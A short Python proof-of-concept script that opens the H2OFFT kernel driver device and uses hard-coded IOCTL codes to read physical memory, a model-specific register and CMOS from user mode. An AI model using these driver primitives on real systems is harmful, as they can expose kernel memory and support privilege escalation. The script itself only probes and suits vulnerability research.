import ctypes, struct, sys
from ctypes import wintypes

k = ctypes.WinDLL("kernel32", use_last_error=True)

READMEM_IOCTL = 0x222298   
RDMSR_IOCTL   = 0x2222CC   
RDCMOS_IOCTL  = 0x222280   

hnd = k.CreateFileW(r"\\.\H2OFFT", 0xC0000000, 0, None, 3, 0, None)
if hnd in (-1, 0xFFFFFFFFFFFFFFFF):
    e = k.GetLastError()
    print("[!] error opening device= %d" % e)
    if e == 2:   print("    -> driver not loaded or service missing")
    elif e == 5: print("    -> access denied (run as administrator)")
    sys.exit(1)
print("[+] device opened successfully (handle=0x%X)" % (hnd & 0xFFFFFFFF))

def doreq(c, inp, olen):
    buf = ctypes.create_string_buffer(max(olen, 1))
    retlen = wintypes.DWORD(0)
    res = k.DeviceIoControl(hnd, c, inp, len(inp), buf, olen, ctypes.byref(retlen), None)
    return bool(res), retlen.value, buf.raw[:retlen.value]

print()
print("[1] reading physical memory")
success, bytes_ret, payload = doreq(READMEM_IOCTL, struct.pack("<II", 0x000F0000, 32), 32)
print("    success=%s, returned=%d bytes" % (success, bytes_ret))
print("    HEX:", payload.hex(" "))

print()
print("[2] reading msr")
success, bytes_ret, payload = doreq(RDMSR_IOCTL, struct.pack("<III", 0x1B, 0, 0), 12)
print("    success=%s, returned=%d bytes" % (success, bytes_ret))
if bytes_ret >= 12:
    idx, lo, hi = struct.unpack("<III", payload[:12])
    print("    MSR 0x%X = 0x%08X%08X (low=0x%X high=0x%X)" % (idx, hi, lo, lo, hi))

print()
print("[3] reading CMOS")
success, bytes_ret, payload = doreq(RDCMOS_IOCTL, bytes([0x00, 0x00]), 2)
print("    success=%s, returned=%d bytes" % (success, bytes_ret))
if bytes_ret >= 2:
    print("    CMOS[0x00] = 0x%02X" % payload[1])

k.CloseHandle(hnd)
